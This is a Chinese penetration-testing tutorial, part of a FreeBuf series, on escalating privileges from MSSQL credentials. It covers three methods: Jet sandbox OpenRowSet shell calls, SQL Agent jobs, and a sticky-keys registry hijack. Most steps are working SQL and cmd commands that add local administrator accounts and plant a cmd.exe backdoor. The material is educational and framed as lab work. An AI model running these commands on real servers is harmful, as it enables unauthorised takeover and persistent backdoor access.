## 系列文章

> [专辑：渗透测试之地基篇](https://www.freebuf.com/column/1998)

## 简介

 **渗透测试-地基篇**

该篇章目的是重新牢固地基，加强每日训练操作的笔记，在记录地基笔记中会有很多跳跃性思维的操作和方式方法，望大家能共同加油学到东西。

 **请注意** ：

> 本文仅用于技术讨论与研究，对于所有笔记中复现的这些终端或者服务器，都是自行搭建的环境进行渗透的。我将使用Kali
> Linux作为此次学习的攻击者机器。这里使用的技术仅用于学习教育目的，如果列出的技术用于其他任何目标，本站及作者概不负责。

名言：

你对这行的兴趣，决定你在这行的成就！

## 一、前言

数据库作为业务平台信息技术的核心和基础，承载着越来越多的关键数据，渐渐成为单位公共安全中最具有战略性的资产，数据库的安全稳定运行也直接决定着业务系统能否正常使用。并且平台的数据库中往往储存着等极其重要和敏感的信息。这些信息一旦被篡改或者泄露，轻则造成企业经济损失，重则影响企业形象，甚至行业、社会安全。可见，数据库安全至关重要。所以对数据库的保护是一项必须的，关键的，重要的工作任务。

通过前几期钓鱼、内网攻防篇章落幕后，引来了服务攻防篇章之数据库渗透篇，不管在外网还是内网环境，只要存在业务系统都存在数据库，在渗透测试对数据库的知识学习是必不可少的，接下来将介绍数据库的渗透基本操作，带小伙伴们了解和学习数据库如何渗透的！

如果获得MSSQL用户密码如何拿到对方服务器权限呢？接下来将把提权技巧告诉大家！

## 二、MSSQL-沙盒提权

### 1、开启沙盒模式

在SQL 2005中默认禁用Ad Hoc Distributed，执行命令时，会提示错误，所以我们需要手动开启。这种提权的方式一般很少用到。

    
    
    exec sp_configure 'show advanced options',1 ;
    reconfigure ;
    exec sp_configure 'Ad Hoc Distributed Queries',1 ;
    reconfigure;
    

![1625817062_60e7ffe689dc95a58a41a.png!small?1625817070124](https://image.3001.net/images/20210709/1625817062_60e7ffe689dc95a58a41a.png!small?1625817070124)

### 2、修复沙盒的维护模式

    
    
    exec master..xp_regwrite 'HKEY_LOCAL_MACHINE','SOFTWARE\Microsoft\Jet\4.0\Engines','SandBoxMode','REG_DWORD',0;
    

![1625817068_60e7ffec74085f4bdd3d0.png!small?1625817070124](https://image.3001.net/images/20210709/1625817068_60e7ffec74085f4bdd3d0.png!small?1625817070124)查看SandBoxMode的值是否已经变成了0

### 3、沙盒模式参数含义

    
    
    沙盒模式SandBoxMode参数含义（默认是2）
    
    0：在任何所有者中禁止启用安全模式
    1 ：为仅在允许范围内
    2 ：必须在access模式下
    3 ：完全开启
    

以下方法需要在32位系统执行，64位系统无4.0：

    
    
    exec master.dbo.xp_regread 'HKEY_LOCAL_MACHINE','SOFTWARE\Microsoft\Jet\4.0\Engines', 'SandBoxMode'
    

![1625817070_60e7ffeee6ff26d966c50.png!small?1625817072678](https://image.3001.net/images/20210709/1625817070_60e7ffeee6ff26d966c50.png!small?1625817072678)![1625817074_60e7fff23d18864e1fbc4.png!small?1625817075413](https://image.3001.net/images/20210709/1625817074_60e7fff23d18864e1fbc4.png!small?1625817075413)

### 4、提权创建账户

    
    
    Select * From OpenRowSet('Microsoft.Jet.OLEDB.4.0',';Database=c:\windows\system32\ias\ias.mdb','select shell("net user testq QWEasd123 /add")');
    

![1625817080_60e7fff81ab4a74110846.png!small?1625817082787](https://image.3001.net/images/20210709/1625817080_60e7fff81ab4a74110846.png!small?1625817082787)报错：'c:\windows\system32\ias\ias.mdb'

解决方法：

    
    
    https://documentation.help/InfoSec-cn/69cc2e9c-95e8-4c82-a787-440190c28fbc.htm
    

1）到windows 2003上复制准备好：  
![1625817084_60e7fffc2f0e50fcadf91.png!small?1625817085237](https://image.3001.net/images/20210709/1625817084_60e7fffc2f0e50fcadf91.png!small?1625817085237)  
dnary.mdb和ias.mdb两个文件

2）然后放入本地在执行后：

![1625817096_60e8000883b456c0f2406.png!small?1625817097433](https://image.3001.net/images/20210709/1625817096_60e8000883b456c0f2406.png!small?1625817097433)成功创建！！

### 5、拓展技巧

Windows 2003 + SQL Server2000 沙盒模式执行命令的语句:  
（Windows 2003
系统c:\windows\system32\ias\目录下默认自带了2个Access数据库文件ias.mdb/dnary.mdb,所以直接调用即可.）

    
    
    select * From OpenRowSet('Microsoft.Jet.OLEDB.4.0',';Database=c:\windows\system32\ias\ias.mdb','select shell("net user  >c:\test.txt ")');
    

Windows 2008 R2+SQL Server2005 沙盒模式执行命令的语句:  
（ Windows 2008 R2 默认无Access数据库文件,需要自己上传,或者用UNC路径加载文件方能执行命令.）

    
    
    select * from openrowset('microsoft.jet.oledb.4.0',';database=\\192.168.1.8\file\ias.mdb','select shell("c:\windows\system32\cmd.exe /c net user  >c:\test.txt ")');
    

### 6、添加到管理员组

    
    
    Select * From OpenRowSet('microsoft.jet.oledb.4.0',';Database=c:\windows\system32\ias\ias.mdb','select shell("net localgroup administrators testq /add")');
    

![1625915223_60e97f57ba2e5da36d417.png!small?1625915223785](https://image.3001.net/images/20210710/1625915223_60e97f57ba2e5da36d417.png!small?1625915223785)

如果遇到问题参考这里的解析：

    
    
    http://blog.chinaunix.net/uid-28966230-id-4291781.html
    

### 7、查询情况

    
    
    select * from openrowset('microsoft.jet.oledb.4.0',';database=c:\windows\system32\ias\ias.mdb','select shell("c:\windows\system32\cmd.exe /c net user  >c:\\2.txt ")');
    

![1625915230_60e97f5e4d03678714903.png!small?1625915230827](https://image.3001.net/images/20210710/1625915230_60e97f5e4d03678714903.png!small?1625915230827)

![1625915234_60e97f62d39027ea91a67.png!small?1625915234928](https://image.3001.net/images/20210710/1625915234_60e97f62d39027ea91a67.png!small?1625915234928)可看到成功的！

### 8、拓展知识

调用dnary.mdb！

    
    
    select * from openrowset('microsoft.jet.oledb.4.0',';database=c:\windows\system32\ias\dnary.mdb','select shell("c:\windows\system32\cmd.exe /c net user  >c:\\3.txt ")')
    

![1625915240_60e97f687ef880538d469.png!small?1625915240965](https://image.3001.net/images/20210710/1625915240_60e97f687ef880538d469.png!small?1625915240965)![1625915244_60e97f6cc023a25c7515b.png!small?1625915244950](https://image.3001.net/images/20210710/1625915244_60e97f6cc023a25c7515b.png!small?1625915244950)可看到也可以调用dnary.mdb！

### 9、恢复配置

    
    
    exec master..xp_regwrite 'HKEY_LOCAL_MACHINE','SOFTWARE\Microsoft\Jet\4.0\Engines','SandBoxMode','REG_DWORD',1;
    exec sp_configure 'Ad Hoc Distributed Queries',0;reconfigure;
    exec sp_configure 'show advanced options',0;reconfigure;
    

通过以上命令恢复下配置即可！

## 三、MSSQL-JOB提权

原理是创建一个任务x，并执行命令，命令执行后的结果，将返回给文档dayu.txt。

### 1、启动sqlagent服务

首先需要启动sqlagent服务：

    
    
    exec master.dbo.xp_servicecontrol 'start','SQLSERVERAGENT'
    

### 2、创建任务

接下来我们创建任务x，执行添加账户的命令，然后将命令返回结果输出到q.txt中。

    
    
    use msdb
    exec sp_delete_job null,'x'
    exec sp_add_job 'x'
    exec sp_add_jobstep null,'x',null,'1','cmdexec','cmd /c "net user hack1 hack1 /add &net localgroup administrators hack1 /add>c:/q.txt"'
    exec sp_add_jobserver null,'x',@@servername
    exec sp_start_job 'x';
    

执行成功后，最终添加了指定的账户！

## 四、MSSQL-利用镜像劫持提权

### 1、修改注册表

首先我们利用regwrite函数修改注册表进行劫持：

    
    
    EXEC master..xp_regwrite @rootkey='HKEY_LOCAL_MACHINE',@key='SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\sethc.EXE',@value_name='Debugger',@type='REG_SZ',@value='c:\windows\system32\cmd.exe'
    

![1625915253_60e97f7523b2a37d14563.png!small?1625915253801](https://image.3001.net/images/20210710/1625915253_60e97f7523b2a37d14563.png!small?1625915253801)

### 2、检查劫持状态

接着我们查看是否劫持成功

    
    
    exec master..xp_regread 'HKEY_LOCAL_MACHINE','SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\sethc.exe','Debugger'
    

![1625915257_60e97f79d9eaa83e65f90.png!small?1625915259253](https://image.3001.net/images/20210710/1625915257_60e97f79d9eaa83e65f90.png!small?1625915259253)

### 3、验证成功

紧接着我们远程连接桌面，然后连续按5次shift就可以调用cmd窗口  
![1625915262_60e97f7e7b65fea28e4f8.png!small?1625915262588](https://image.3001.net/images/20210710/1625915262_60e97f7e7b65fea28e4f8.png!small?1625915262588)

可看到成功的执行！

## 五、总结

经过了安全三打版本的MSSQL后，在前一篇进行了xp_cmdshell、sp_oacreate提权渗透的总结和演示，这篇又加固了沙盒、JOB、镜像劫持提权渗透方法，学到了非常多的小技巧和干货，希望小伙伴能实际操作复现一遍！

    
    
    服务攻防之数据库Mysql（上）-> 服务攻防之数据库Mysql（下）-> 服务攻防之数据库MSSQL（上）-> 服务攻防之数据库MSSQL（中）-> 服务攻防之数据库MSSQL（下）......
    

接下来在《服务攻防之数据库Oracle（上）》会接触到如何对Oracle是如何安装的，如何提权渗透等方法，请看下篇服务攻防之数据库Oracle上篇章！

希望大家提高安全意识，没有网络安全就没有国家安全！

今天基础牢固就到这里，虽然基础，但是必须牢记于心。

作者：大余

